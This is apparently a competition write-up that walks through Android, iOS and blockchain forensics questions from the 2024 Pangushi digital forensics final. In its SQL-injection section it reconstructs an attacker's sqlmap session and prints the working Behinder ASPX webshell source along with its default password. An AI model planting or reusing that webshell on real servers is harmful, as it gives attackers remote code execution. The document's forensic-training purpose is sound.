---
Title: PGSCup2024_Final_WalkThrough
Author: NoahTie, BlackBird @ 猫猫啥也不会
date: 2025-04-08 00:00:00
tags:
- 电子数据取证
- wp
description: 2024年第二届盘古石杯电子取证竞赛决赛题解
---

# 2024年第二届盘古石杯电子取证竞赛决赛题解

> Author: NoahTie & BlackBird @ 猫猫啥也不会
> 


> 检材容器密码: `f38043615a64f2a4013b0511c89bb07f`
> 
> 3D 案情密码: `DFD99BB7E073901A33D382A1431FC90E`
> 
> 3D 案情登录信息: 账号: `11111111111`, 密码 `111111`
> 


## 写在前面

本来我是不打算做盘古石的复盘的, 因为比起美亚来说, 盘古石在案情引导和题目的合理程度上都不如近几年的美亚. 非常不建议刚入门取证的同学来做这套题目. 

当时打比赛的时候就一直有一种无力感, 因为大多数题目在做的时候根本不需要技巧, 全局搜索, 然后翻文件, 这样的题在这场比赛里面至少有 20 道.

以及无比逆天的检材嵌套: Android 里面又是 VMOS 虚拟机, 又是 Termux 装 Kali; Windows 里面有虚拟磁盘, 虚拟磁盘里有加密文件, 甚至还有俩 Android 模拟器; iOS 里面都要套个加密工具. 

不过好在题目中有不少 WEB 方向的题目, 对我来说基本算是送分了, 所以当时比赛的时候介质取证部分基本上跳过了一小半题目, 重心全在后面的服务器取证, 结果还是拿到挺好的成绩.

但也从侧面说明了一个问题, 整套题目的检材和案情是完全可以剥离的. 我在做复盘的时候甚至连案情看都没看, 之后整理题解的时候才发现, 怎么题解里没有贴案情. 然后就又想起来那个虚幻 4 做的 3D 案情. 如果让我再选一次, 我大概还是会选择直接拆包.


---

## 案情

3D 案情里的信息:

> 电脑密码: WDKC720307
> 
> ~~GOIP: KHBMB23727~~  GOIP:KHMB23727
> 
> 手机: 793627
> 
> 路由器: TLINK81235
> 
> 私有容器密码: pgs20240605BCS
> 
> 钱包地址: 0xa2af1c188e828a440d32ec6a206cac5310b74bc1
> 

有用的只有钱包地址和私有容器密码, 其它信息都没有用上. 甚至有些信息和检材内信息冲突, 形成了平行宇宙.


---

## Android 手机

> 对应检材 `三星手机\Image.zip`.
> 

比赛上来就是个大的. 整个 72.1 GB 的 zip 压缩包, 光解压就得 30 多分钟, 还是 16 线程跑满的解压速度.

手机里面套了 2 个 VMOS 的安卓虚拟机, 其中 1 个虚拟机里面又有 Termux. CTF 都少见的 3 层套娃没想到在取证里面见到了. 结果就是, 没什么信息量的检材占了 70 多 GB 的空间. 高低是有点逆天的.

真的比赛遇到这种东西, 直接整个检材跳过可能得分反而更高.


### 1.空闲的磁盘空间是多少

> ==146.34 GB==
> 

![Pasted image 20250408160114.png](./attachments/Pasted%20image%2020250408160114.png)


### 2.蓝⽛ MAC 地址

> ==78:46:d4:8f:38:2e==
> 

![Pasted image 20250408160131.png](./attachments/Pasted%20image%2020250408160131.png)


### 3.吴某浏览过最贵的⼀双鞋⼦是多少钱

> ==1659==
>

在得物的分析结果中, 可以看到收藏和浏览记录, 但自动取证结果不完整:

![Pasted image 20250408160336.png](./attachments/Pasted%20image%2020250408160336.png)

需要跳转到原文件进行手动分析. 

![Pasted image 20250408161015.png](./attachments/Pasted%20image%2020250408161015.png)

可以看到价格显示最高的是 `165900`, 没有小数的话单位应该是分.


### 4.手机中最⾼版本的安卓虚拟机的 WiFi 的 MAC

> ==12:34:56:12:e8:24==
> 

手机里安装了 VMOS, 是个安卓平台的安卓虚拟机应用.

虚拟机文件存储在 `Android/data/data/com.VMOS.pro/osimg/r` 目录下, 一共安装 2 个虚拟机系统. 分别查看其中的 `guestOSinfo`, `ot01` 是 Android 9
系统, `ot02` 是 Android 7 系统.

或者在 ` Android/data/data/com.VMOS.pro/conf/existVm.json.bak` 中也可以看到虚拟机的信息:

![Pasted image 20250408162732.png](./attachments/Pasted%20image%2020250408162732.png)

接下来就是嵌套检材的取证了, 火眼里面直接将 `ot01` 文件夹添加为新检材就行.

在 ` ot01/system/build.prop` 和 ` ot01/system.prop` 中可以看到设备信息, 其中包括 MAC 地址:

![Pasted image 20250408163141.png](./attachments/Pasted%20image%2020250408163141.png)


### 5.发现在安卓虚拟机中使用浏览器最早保存的书签地址

> ==https:\/\/zhuanlan.zhihu.com\/p\/370879038?utm_id=0==
> 

在 `ot01` 里面没有发现浏览器的使用记录, 所以大概是在 `ot02` 里面. 继续添加为新检材.

夸克的书签:

![Pasted image 20250408164031.png](./attachments/Pasted%20image%2020250408164031.png)

悟空浏览器的书签没有自动分析出来, 手动翻看 `database` 中的数据库后也没有觉得哪个像是书签的数据库.

于是动用传统艺能, 拿一台 ROOT 过的手机, 安装悟空浏览器收藏点东西(XDSEC 的主页和 L team 的主页), 提文件出来手动分析. 搜索了一下, 有这些命中:

![Pasted image 20250408173850.png](./attachments/Pasted%20image%2020250408173850.png)

数据库里只有搜索关键词的记录:

![Pasted image 20250408172248.png](./attachments/Pasted%20image%2020250408172248.png)

剩下的都是 cache 和 log, 说明悟空的书签数据并不保存在 `data\data\` 中, 而是可能在 `\sdcard\Android\data\` 中, 再次导出并搜索:

![Pasted image 20250408172933.png](./attachments/Pasted%20image%2020250408172933.png)

但还是不对.

直到我想着断网情况下删除一条收藏, 看看文件修改时间的时候, 我发现, 这个浏览器的收藏居然是云端数据... 那看来本地存储的书签数据就在某个缓存里了.

那现在就要看那个缓存里面同时有`https://xdsec.org` 和 `https://l.xdsec.org` 了:

![Pasted image 20250408175040.png](./attachments/Pasted%20image%2020250408175040.png)

看来只有 log 里面有了. 看了看 log, 也只能看出来访问过这两个网站. 

综上, 未能在悟空浏览器的数据中找出书签的记录. 并且, 我倾向于悟空浏览器只是下载并运行了一次, 并没有实际上访问任何网页.


### 6.发现在安卓虚拟机中使用浏览器最后⼀次的访问地址

> ==https:\/\/m.quark.cn\/s?q=源码网&from=kkframenew&uc_param_str=dnntnwvepffrbijbprsvchgputdemennosstodcaaapcgidsdieinipikp&by=suggest&extra_params=AAN3UlC+kC6uKpnBo9DX2Ezt6IXm7/uRWyHngyRvcJClOvL3NbHP7d+PnVxI3bTS5AjBPRPxpU+AEKB8Q+tQ4HKl&prefetch=search==
> 

![Pasted image 20250408180112.png](./attachments/Pasted%20image%2020250408180112.png)

悟空浏览器中则没有任何网页的缓存:

![Pasted image 20250408180341.png](./attachments/Pasted%20image%2020250408180341.png)


### 7.手机中远程控制软件的密码

> ==lp604n==
> 

远控软件是向日葵:

![Pasted image 20250408180813.png](./attachments/Pasted%20image%2020250408180813.png)


### 8.手机中创建了几个安卓虚拟机

> ==2==
> 

见 Android 手机部分 - 第 4 题.


### 9.手机中安卓虚拟机下载了几个 ROM

> ==4==
> 

在 VMOS 的 data 目录下:

![Pasted image 20250408180854.png](./attachments/Pasted%20image%2020250408180854.png)


### 10.有几张图片是通过 AI 生成的, 这些图是哪个应用生成的, 写出该应用安装包的完整路径

>  ==Image.zip/data/data/com.VMOS.pro/osimg/r/ot01/data/app/com.zhipuai.qingyan-LLwjwKjpV8sNuMMYnuet3Q\=\=/base.apk==
>  

看到安装有智谱清言:

![Pasted image 20250408181046.png](./attachments/Pasted%20image%2020250408181046.png)

但是找到的图片是在 VMOS 的输出文件夹里的, 图片来源应该是 VMOS 虚拟机里的某个应用, 但图片右下角又有智谱 AI 的 LOGO:

![Pasted image 20250408181239.png](./attachments/Pasted%20image%2020250408181239.png)

在 `ot01` 里面也找到了智谱清言和 Termux:

![Pasted image 20250408181409.png](./attachments/Pasted%20image%2020250408181409.png)

在 `ot02` 里面也找到了智谱清言:

![Pasted image 20250408181521.png](./attachments/Pasted%20image%2020250408181521.png)

最终在 `ot01` 中找到了生成的原始图片:

![Pasted image 20250408181648.png](./attachments/Pasted%20image%2020250408181648.png)

因此应用的安装包的路径应以 `ot01` 中的路径为准:

![Pasted image 20250408181750.png](./attachments/Pasted%20image%2020250408181750.png)

回到原始检材中的路径:

![Pasted image 20250408181926.png](./attachments/Pasted%20image%2020250408181926.png)


### 11."屏幕截图 2023-06-01 141051.png" 这个图片来⾃哪个应用, 请写出应用的包名

> ==org.localsend.localsend_app==
> 

图片内容是 Metasploit 的电脑截图, 文件应该是下载或者从电脑传送的. 结合文件名, 大概率是电脑发送的. 在检材中找到了 LocalSend, 查看一下媒体数据库 `external.db`:

![Pasted image 20250408182956.png](./attachments/Pasted%20image%2020250408182956.png)

在 LocalSend 的配置文件里也有记录:

![Pasted image 20250408183417.png](./attachments/Pasted%20image%2020250408183417.png)

![Pasted image 20250408183707.png](./attachments/Pasted%20image%2020250408183707.png)


### 12.接上题, 这个图片的发送者名称

> ==Handsome Orange==
> 

见上题.


### Kali in Termux

Termux 是 Android 平台的 Linux 模拟器应用, 默认安装一个最小系统. 但用户可以通过 proot (Pseudo Root) 来安装任何支持手机处理器架构的 Linux 发行版. ~~我曾经在平板上用这玩意儿做过操作系统的大作业...~~

比较尴尬的一点是, 火眼的嵌套检材识别居然没有分析出来 Termux 的存在. 

Termux 的存储位于 `Android/data/data/com.termux/files` 中. 这里存放的是用户文件, Termux 使用的 Linux 内核是手机系统内核(类似于 Docker 内核). 而最小系统是否拥有 Root 权限也取决于实机的情况.

在 `/home/.bash_history` 中可以看到曾经执行过的命令:

![Pasted image 20250411115048.png](./attachments/Pasted%20image%2020250411115048.png)

其中 `proot-distro login debian` 就是通过 `proot` 启动了 `debian` 系统. 众所周知, Kali 是 Debian 的一个发行版. 而 Kali 的文件系统则位于 `/home/kali-arm64` 中, 这里才算一个真正意义上的虚拟机.

可以在火眼中将 `/home/kali-arm64` 作为新检材添加.

以下题目中的路径均为对于 `Android/data/data/com.termux/files/home/kali-arm64` 的相对路径.


### 13.kali 开放的 ssh 端口是

> ==2222==
> 

在 `/etc/ssh/sshd_config`:

![Pasted image 20250411115749.png](./attachments/Pasted%20image%2020250411115749.png)


### 14.存在 SQL 注入漏洞的网站网址是

> ==http://112.124.62.187:8080/Login/ValidateLogin==
> 

在 `/root` 目录下可以看到 zsh 的历史记录 `.zsh_history`, 其中有关于 sqlmap 的历史记录:

![Pasted image 20250411115958.png](./attachments/Pasted%20image%2020250411115958.png)

sqlmap 从文件中读取参数, 文件 `1.txt` 内容:

![Pasted image 20250411120120.png](./attachments/Pasted%20image%2020250411120120.png)

可以看到在 `http://112.124.62.187:8080/Login/ValidateLogin` 进行注入.

sqlmap 的历史记录文件存储在 `/root/.local/share/sqlmap/` 目录中, 在 `output/112.124.62.187/log` 中可以看到命令行的历史记录.

数据库后端是 MSSQL Server, 给出了 3 种注入方案, 分别是布尔盲注, 堆叠注入和时间盲注:

![Pasted image 20250411120604.png](./attachments/Pasted%20image%2020250411120604.png)

获取到数据库名称:

![Pasted image 20250411120728.png](./attachments/Pasted%20image%2020250411120728.png)

确认了当前用户有管理员权限:

![Pasted image 20250411120803.png](./attachments/Pasted%20image%2020250411120803.png)

执行命令行, 获取 IP 信息和系统用户信息:

![Pasted image 20250411120835.png](./attachments/Pasted%20image%2020250411120835.png)

执行命令行, 获取 RDP 端口信息:

![Pasted image 20250411120920.png](./attachments/Pasted%20image%2020250411120920.png)

执行命令行, 开始文件操作, 并试图在 cmd 中执行 PowerShell 函数:

![Pasted image 20250411120952.png](./attachments/Pasted%20image%2020250411120952.png)

![Pasted image 20250411121040.png](./attachments/Pasted%20image%2020250411121040.png)

然后上传一段 `C#` 代码编写的 ASP.NET WebShell, 因为编码问题, 中文注释全部乱码了:

![Pasted image 20250411121216.png](./attachments/Pasted%20image%2020250411121216.png)

整理一下是:

```c#
<%@ Page Language="C#" %>
<%@Import Namespace="System.Reflection"%>
<%
Session.Add("k","e45e329feb5d925b") // 将 k 存储到 Session 中
byte[] k = Encoding.Default.GetBytes(Session[0] + ""), c = Request.BinaryRead(Request.ContentLength) // k 是上述 Session 中的 k, c 是请求正文中的数据
Assembly.Load(
    new System.Security.Cryptography.RijndaelManaged() // AES
        .CreateDecryptor(k, k) // 解密器, 密钥和 IV 都用 k
        .TransformFinalBlock(c, 0, c.Length) // 解密 c
).CreateInstance("U").Equals(this) // 加载为二进制文件, 并加载到内存中.
// 之后从加载的程序中创建 U 类的实例, 并调用 U.Equals() 方法
%>
```

熟悉冰蝎的 WEB 手应该能看出来这是冰蝎自带的 ASPX WebShell. 在计算机检材的 `PC.E01\Software\PentestTools\framvuln\GUI_Tools_3\gui_webshell\Behinder_v4.0.6\server` 目录下可以看到.

![Pasted image 20250411124107.png](./attachments/Pasted%20image%2020250411124107.png)

![Pasted image 20250411124238.png](./attachments/Pasted%20image%2020250411124238.png)

密码未修改, 就是默认密码 `rebeyond`.


### 15.存在 SQL 注入漏洞的网站的内网 IP 地址是

> ==172.16.0.137==
> 

见上题. 


### 16.存在 SQL 注入漏洞的网站服务器被添加了几个账户

> ==3==
> 

见上题.

系统中共有 `admin1`, `administraotr1`(是的, 原题里面真的是这样拼的), `Administrator` , `delete` 和 `Guest` 合计 5 个账户. 其中, 默认管理员账户 `Administrator` 和默认访客账户 `Guest` 为系统创建的用户, 其余 3 个账户为用户添加的.


### 17.存在 SQL 注入漏洞的网站服务器上已有 webshell 的连接密码

> ==rebeyond==
> 

见上题.

webshell 的连接密码从计算机上的冰蝎的数据库 `PC.E01\Software\PentestTools\framvuln\GUI_Tools_3\gui_webshell\Behinder_v4.0.6\data.db` 中也能看到.


---

## iOS 手机

> 对应检材 `苹果手机\Image.zip`.
> 

这里推荐一个轻量化的开源 iOS 自动取证工具: [abrignoni/iLEAPP: iOS Logs, Events, And Plist Parser](https://github.com/abrignoni/iLEAPP)

还是之前看一场外国的 CTF 比赛的 WP 的时候看到的, 个人感觉相当好用. 甚至可以自己给 iLEAPP 写插件, 使用的是 python 语言, 并且官方提供了非常详细的文档.


### 8.手机中安装的第三方 APP (排除系统应用)的数量合计

> ==20==
> 

在应用列表中筛选一下: 

![Pasted image 20250408135541.png](./attachments/Pasted%20image%2020250408135541.png)


### 9.吴某尝试登录 telegram 应用所使用的手机号码

> ==13800135700==
> 


在 `/private/Applications.plist` 中可以看到 Telegram 的共享应用数据目录 `/private/var/mobile/Containers/Shared/AppGroup/1EB861E9-9A8D-4BA8-A71D-A6BA1255DB30`:

![Pasted image 20250408140300.png](./attachments/Pasted%20image%2020250408140300.png)

以及应用的安装位置 `/private/var/containers/Bundle/Application/50ADC3E7-6D97-40FD-ADB5-56600F8BA2EC/Telegram.app` 和应用的数据目录 `/private/var/mobile/Containers/Data/Application/D3E2A2F6-5A43-4B07-B0FF-F053E53DB84E`:

![Pasted image 20250408140751.png](./attachments/Pasted%20image%2020250408140751.png)

用户信息存储在应用私有数据目录下, 但并没有记录用户信息的数据库或 plist 文件. 结合题目中的"尝试"二字, 猜测其实并没有登陆成功. 

可以在 目录下找到 iOS 自动生成的屏幕截图(用于应用预览):

![Pasted image 20250408142345.png](./attachments/Pasted%20image%2020250408142345.png)

在分析结果的屏幕截图中可以看到:

![Pasted image 20250408142511.png](./attachments/Pasted%20image%2020250408142511.png)

在 iLEAPP 的报告中也可以看到:

![Pasted image 20250408144900.png](./attachments/Pasted%20image%2020250408144900.png)


### 10.吴某是从什么 iOS 版本升级到当前版本的

> ==16.0.3==
> 

![Pasted image 20250408145629.png](./attachments/Pasted%20image%2020250408145629.png)

iLEAPP 取到了升级记录, 但是没有识别到系统的原始版本.

iOS 升级相关的日志和配置文件都位于 `/private/var/MobileSoftwareUpdate` 中, 在 `secure.log` 中找到了与升级相关的 log:

![Pasted image 20250408151310.png](./attachments/Pasted%20image%2020250408151310.png)

显示是从 16.0.3 升级到 16.1 版本, 但是时间又和 iLEAPP 取到的对不上. 一个在 22 年, 一个在 24 年.

又看了一下更新程序的日志 `/private/var/MobileSoftwareUpdate/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate/com_apple_MobileAsset_SoftwareUpdate.xml` 大概明白是怎么回事了. 系统只安装了 16.1 的更新, 但系统的更新程序已经检测到了 16.7.8 的更新. 


### 11.手机相册中的照片中, 有多少张是通过 iPhone 8 手机拍摄的

> ==7==
> 

在 iLEAPP 的报告对 photo.sqlite 的取证结果中, 过滤含有 iphone 8 字样的图片:

![Pasted image 20250408153122.png](./attachments/Pasted%20image%2020250408153122.png)

共有 7 张.

将相册中所有图片导出后依次查看 EXIF 信息也可以.


### 12.手机曾开启热点, 供其他人连接, 分析手机开启的热点连接密码

> ==hello123girl==
> 

以前遇到过类似的题, iOS 的热点信息保存在 `hostapd.conf` 文件里, 做题的时候想不起来具体路径了, 直接搜索文件名:

![Pasted image 20250408153818.png](./attachments/Pasted%20image%2020250408153818.png)


### 13.接上题, 分析成功连接到手机热点的手机型号

> ==OPPO-A11x==
> 

在手机的 dhcp 服务器配置 `dhcpd_leases` 里:

![Pasted image 20250408154759.png](./attachments/Pasted%20image%2020250408154759.png)


### 14.吴某曾连接过阿里云服务器, 并将服务器的宝塔面板信息保存在手机上, 请问该阿里云服务器的内网IP地址

> ==http:\/\/172.28.39.11:35394\/1d11d9a4==
> 

在 iCloud 同步记录中有文件名为 `panel info.txt`:

![Pasted image 20250408155321.png](./attachments/Pasted%20image%2020250408155321.png)

直接全局搜索文件名或者定位到文档目录可以找到 `/private/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/panel info.txt`, 文件内容:

![Pasted image 20250408155711.png](./attachments/Pasted%20image%2020250408155711.png)

如果对检材做了文本索引或者全局搜索文件内容的话, 也可以通过直接搜索 `panel` 或者 `BT-Panel` 找到.


### 15.警方在勘验苹果手机时, 发现手机中有⼀个叫"私密空间"的应用。该应用打开需要密码, 请分析苹果手机检材, 该应用的打开密码是

> ==147258==
> 

![Pasted image 20250408194426.png](./attachments/Pasted%20image%2020250408194426.png)

找到应用的数据目录:

![Pasted image 20250408193628.png](./attachments/Pasted%20image%2020250408193628.png)

解个 Base64 编码:

![Pasted image 20250408193702.png](./attachments/Pasted%20image%2020250408193702.png)


### 16.接上题, 分析该应用中⼀共加密了多少张图片

> ==1==
> 

在应用数据库里可以看到关于加密文件的条目:

![Pasted image 20240607182138.png](./attachments/Pasted%20image%2020240607182138.png)

![Pasted image 20250408194021.png](./attachments/Pasted%20image%2020250408194021.png)

可以判断文件为 HEIC 格式的图片,  并可以找到本地保存的位置.

app 的核心文件位于 `/private/var/containers/Bundle/Application/42D2EE98-D032-4154-9CF8-997D5F4D8319/Vault.app/Vault`, DIE 查一下, 是 Xcode 构建的. 

然后突然想起来, 我又不是逆向手, 哪儿会 iOS 逆向啊. 果断放弃逆向. ~~回头看学学, 有机会补上.~~

对比检材中存储的其它 HEIC 格式图片,  发现应用仅对文件进行了删除文件的前 128 字节并添加了文件头: 

![Pasted image 20250408195523.png](./attachments/Pasted%20image%2020250408195523.png)

![Pasted image 20250408200302.png](./attachments/Pasted%20image%2020250408200302.png)

我猜"加密"程序的工作原理就是, 把图片文件的前 128 Byte 保存到某个地方(或者如果识别到是 HEIC 图片就直接抹掉前 128 Byte), 然后添加 128 Byte 的自定义头.

![Pasted image 20250408200549.png](./attachments/Pasted%20image%2020250408200549.png)

~~接头霸王.jpg~~

![Pasted image 20250408200621.png](./attachments/Pasted%20image%2020250408200621.png)

#### 逆向分析

`Vault.app\Vault` 是应用的核心可执行文件, 用 DIE 看一下信息:

![Pasted image 20250410104512.png](./attachments/Pasted%20image%2020250410104512.png)

可以直接用 IDA 加载. IDA 9.1 对 Objective-C 的支持好很多, 支持自动识别 OBJ-C 的对象和成员函数.

在 `-[MediaDBAdapter importSingleMedia:asset:]`(`MediaDBAdapter` 类的  `importSingleMedia:asset:` 函数) 中可以看到以下逻辑:

```objc
(signed __int64)importSingleMedia:(id)media asset:(id)asset {
    
    signed __int64 userId = self->_userId; 
    
    // check if user exists
    
    // assign some folder variables
    
    // Output debug log, snip
    
    __block NSString *md5 = nil; 
    NSString *relativePath = nil; 
    NSString *serverPath = nil; 
    
    if ([media mediaType]) {
    
        // Handle video file
        
    } else { 
    
        // Handle image file
        
    }
}
```

主要看看处理图片的部分:

![Pasted image 20250410112544.png](./attachments/Pasted%20image%2020250410112544.png)

![Pasted image 20250410112647.png](./attachments/Pasted%20image%2020250410112647.png)

![Pasted image 20250410112746.png](./attachments/Pasted%20image%2020250410112746.png)

`LABLE_15` 中做的事情都是在往数据库里写入文件信息, 和上述数据库中结构一致.

那么, 关于文件加密的操作应该都是在 `Handle image file` 那一段完成的, 这段中有一个比较明显的函数 `-[MediaDBAdapter saveMediaFile:content:]` 与文件存储有关:

![Pasted image 20250410113122.png](./attachments/Pasted%20image%2020250410113122.png)

在 `-[MediaDBAdapter encryPhotoData:keyGen:]` 中:

![Pasted image 20250410114106.png](./attachments/Pasted%20image%2020250410114106.png)

![Pasted image 20250410120118.png](./attachments/Pasted%20image%2020250410120118.png)

还原后的源码:

```objc
if (a3 && [a3 length] > 127) {
    
    // check if user exists, snip
    
    // debug log, snip
    
    NSMutableData *v7 = [[NSMutableData alloc] init];
    [v7 appendData:[self getPaddingData:[a3 length]]];
    // v7 is custom file header
    
    NSData *v8 = [a3 subdataWithRange:NSMakeRange(128, [a3 length] - 128)]; 
    // v8 is file content[128:]
    
    if (v8) {
        [v7 appendData:v8];
    }
    [v7 appendData:[PublicObject aesEncryptData:[a3 subdataWithRange:NSMakeRange(0, 128)] 
                          withKey:[PublicObject getHashValueString:[a4 dataUsingEncoding:NSUTF8StringEncoding]]];
}
```

先判断文件长度是否大于 127 字节, 是则截取文件前 128 字节. 接着用 `-[MediaDBAdapter getPaddingData:]` 生成一段数据并存贮在 `v7` 中:

![Pasted image 20250410114946.png](./attachments/Pasted%20image%2020250410114946.png)

再根据之后的拼接操作, 判断这是替换了文件前 128 字节的数据. 与上述分析中看到的加密文件的文件头一致:

![Pasted image 20250410115229.png](./attachments/Pasted%20image%2020250410115229.png)

其中 `a3` 为原始文件的大小, 加密文件中的值经过端序转换后是 `41 13 EC`.

接着截取文件 128 字节之后的数据, 存储在 `v8` 里. 然后将 `v8` 拼接在 `v7` 之后.

再调用 `+[PublicObject aesEncryptData:withKey:]` 对文件的前 128 字节进行加密, 并将加密后的结果拼接在 `v7` 之后:

![Pasted image 20250410120004.png](./attachments/Pasted%20image%2020250410120004.png)

![Pasted image 20250410120702.png](./attachments/Pasted%20image%2020250410120702.png)

加密的使用 key 来源于用户的密码, 获取密码的代码在 `-[UserDBAdapter getPassword:]` 中:

![Pasted image 20250410120951.png](./attachments/Pasted%20image%2020250410120951.png)

用户的密码是对数据库 `SBUserInfo` 中的 `password` 字段值进行 Base64 解码之后的值. 对数据库中的值进行解码, 得到密码为 `147258`:

![Pasted image 20250410121144.png](./attachments/Pasted%20image%2020250410121144.png)

用于加密的函数 `CCCrypt`:

![Pasted image 20250410121801.png](./attachments/Pasted%20image%2020250410121801.png)

其中的 key 是 `Crc(password)`:

![Pasted image 20250410122436.png](./attachments/Pasted%20image%2020250410122436.png)

从加密文件文件尾提取出来 AES 加密过的前 128 字节:

![Pasted image 20250410122748.png](./attachments/Pasted%20image%2020250410122748.png)

不过目前就卡在这里了, CRC-32 生成 32 bit 不知道是怎么扩展成 AES-128 的 128 bit 密钥的. 试了右侧补零, 不对.


### 17.接上题, 解密被加密图片, 图片中记录的密码是

> ==pgs20240605BCS==
> 

见上题.


### 18.警方在勘验苹果手机时, 发现手机中还有⼀个基于屏幕使用时间功能扩展的应用, 该应用打开也需要密码, 分析手机检材, 该应用的打开密码是

> ==147258==
> 

筛选一下非预装且分类不明的应用, 看到一个叫 Cloak(斗篷, 音同 Clock) 的应用:

![Pasted image 20250408200948.png](./attachments/Pasted%20image%2020250408200948.png)

看到 Cloak 的私有存储目录是 `/private/var/mobile/Containers/Data/Application/0673D8E2-8C03-45F1-848C-DE978C5CDB26`, 共享存储目录是 `/private/var/mobile/Containers/Shared/AppGroup/76D24375-B4D6-42D6-80A1-4EDDFD417FEB`. 

![Pasted image 20250410134551.png](./attachments/Pasted%20image%2020250410134551.png)

在 `/private/var/mobile/Containers/Shared/AppGroup/76D24375-B4D6-42D6-80A1-4EDDFD417FEB/Library/Preferences/group.com.air-matters.cloak.plist` 中看到以下内容:

![Pasted image 20250410134808.png](./attachments/Pasted%20image%2020250410134808.png)

隐藏了 1 个应用, 密码是 `147258`. 


### 19.接上题, 该应用隐藏了多少个APP

> ==1==
> 

见上题.


### 20.接上题, 该应用限制了位置信息, 通过分析, 设定的位置所属的城市是

> ==成都==
> 

在私有存储目录的 `/private/var/mobile/Containers/Data/Application/0673D8E2-8C03-45F1-848C-DE978C5CDB26/Library/Preferences/com.air-matters.Cloak.plist` 中可以看到:

![Pasted image 20250410135932.png](./attachments/Pasted%20image%2020250410135932.png)

设置了一个区域, 中心点经纬度为 (104.05978972986394, 30.58276663508925), 半径为 100 (单位大概是米). 用经纬度去查询一下地理位置:

![Pasted image 20250410140358.png](./attachments/Pasted%20image%2020250410140358.png)

在成都.


### ﻿21.审讯时, 吴某交代其有通过手机中的某个应用对服务器数据库进行维护的习惯, 分析苹果手机检材, 给出该应用的应用名称

> ==快捷指令==
> 

虽然手机上有 Termius, 但 Termius 的应用目录里什么都没有.

![Pasted image 20250408201537.png](./attachments/Pasted%20image%2020250408201537.png)

看到 Termius 的共享存储目录是 `/private/var/mobile/Containers/Shared/AppGroup/9C10B3EF-1FF7-4696-8C4B-0D5441E7A699`, 私有存储目录是 `/private/var/mobile/Containers/Data/Application/2DF3CDD9-E9A5-4663-A4DA-2AFDE9D89D0D`. 

![Pasted image 20250410140640.png](./attachments/Pasted%20image%2020250410140640.png)

然后想到之前一个工作流全在苹果设备上的朋友跟我提过, 用快捷指令可以一键把本地服务端同步到服务器上并部署. 翻了一下, 还真在:

![Pasted image 20250410145158.png](./attachments/Pasted%20image%2020250410145158.png)


### 22.接上题, 该应用对服务器数据库的操作, ⼀共需要多少步操作

> ==14==
> 

这里有些奇怪, 一共存储了 2 个连接 ssh 的快捷操作, 分别是 `backup` 和 `yourcode`. 操作内容是 JSON 格式的, 整理一下:

快捷指令 backup:

![Pasted image 20250410141900.png](./attachments/Pasted%20image%2020250410141900.png)

![Pasted image 20250410141914.png](./attachments/Pasted%20image%2020250410141914.png)

一共设置了 2 个变量. 每次设置变量都是, 获取文本 -> b64decode -> 设置为变量. ~~哪儿来的栈操作~~

整个执行过程是:

- host = 8.138.86.110
- pwd = GLOOMYbear603!
- 连接 ssh 并发送 `bt 14`

但是 `bt 14` 实际上是宝塔面板用于获取面板信息的指令, 与备份无关.

快捷指令 yourcode:

![Pasted image 20250410144642.png](./attachments/Pasted%20image%2020250410144642.png)

![Pasted image 20250410144654.png](./attachments/Pasted%20image%2020250410144654.png)

![Pasted image 20250410144705.png](./attachments/Pasted%20image%2020250410144705.png)

![Pasted image 20250410144716.png](./attachments/Pasted%20image%2020250410144716.png)

![Pasted image 20250410144723.png](./attachments/Pasted%20image%2020250410144723.png)

整个执行过程是:

- host = 192.168.137.22
- pwd = bullshit
- cmd2 = sha1(select_photo())
- cmd1 = python /root/bak.py
- 连接 ssh 并依次发送 cmd1 和 cmd2

这个看起来像是在服务器上用 python 脚本进行备份, 密码也许是选择图片的 SHA1 值.

此外, 还能找到两个与快捷指令相关的 WebClip, 作用类似于快捷方式, 通过调用 Schema URL 启动应用.

![Pasted image 20250410150209.png](./attachments/Pasted%20image%2020250410150209.png)


### 23.接上题, 上述操作过程中, ⼀共涉及几个变量

> ==4==
> 

见上题.


### 24.接上题, 该服务器的 IP 地址是

> ==192.168.137.22==
> 

见第 22 题.


### 25.接上题, 上述操作过程中, 生成备份文件的压缩密码是

> 本题存疑.
> 

根据上述分析, 在 `python /root/bak.py` 后发送到服务器的 SHA1 很可能是备份文件的密码. 问题就在于找到用户曾经选择的照片是哪张.

在快捷指令的全部存储目录都找了, 没有找到任何关于图片的记录.

![Pasted image 20250410145536.png](./attachments/Pasted%20image%2020250410145536.png)


### 26.继续分析该应用, 该应用在相册中⼀共生成了多少张图片

> ==1==
> 

生成了 1 张图片:

![Pasted image 20250410151114.png](./attachments/Pasted%20image%2020250410151114.png)


### 27.继续分析该应用, 吴某通过该应用还获取了⼀个 APK 的下载链接地址, 请问该 APK 的下载链接地址中包含的时间戳是

> ==1650077751==
> 

应该是通过快捷指令 apk 获取的, 指令内容是:

- 下载 `https://h5publish.gamelaoyou.com/Mahjong_Native/huizhou/config.json`
- 从 `config.json` 获取键 `huizou_2.0.2` 的值
- 从 `config.json` 获取键 `androidVersion` 的值
- 从 `config.json` 获取键 `app_down_Url` 的值
- 将 `app_down_Url` 的值生成一个二维码
- 将生成的二维码存储到相册

上题中相册中的二维码就是由该指令生成的, 识别二维码后得到网址: `https://download.gamelaoyou.com/9099-2022-04-16-10-55-51.apk` 是 JSON 文件中的 `app_down_Url`. 从中可以提取到时间 `2022-04-16-10-55-51`, 转换为时间戳:

![Pasted image 20250410152900.png](./attachments/Pasted%20image%2020250410152900.png)


## 区块链分析 

> 没什么意思, 纯靠看区块链报告. 比赛没提供文件, 还得自己去平台上查. 
> 
> 当时线下赛, 甚至只有 1 台还是 2 台上网机, 申请了几十分钟不停催着才让用. 钱包地址存到硬盘里接网机也不让, 手机也不让用, 最后队友没办法, 翻出来根签字笔抄手上了, 还不小心抄错一个大小写. 老祖宗的智慧放到现在还是对的: "没这金刚钻, 别揽瓷器活".
> 
> 整个虚幻引擎的 3D 案情, 没啥意思, 还不如给个附件来得实在. 当时打比赛的时候我直接 Umodel 拆包看的.
> 


### 1.通过 3D 案情, 得到另⼀个钱包地址, 请问地址是

> ==0xa2af1c188e828a440d32ec6a206cac5310b74bc1==
> 


### 2.钱包地址信息对应哪⼀条公链

> ==Ethereum==
> 

格式明显是以太坊的地址, BSCScan 搜一下.

[Address 0xa2af1c188e828a440d32ec6a206cac5310b74bc1 | BscScan](https://bscscan.com/address/0xa2af1c188e828a440d32ec6a206cac5310b74bc1)

下一个 CSV 看起来会方便一些.

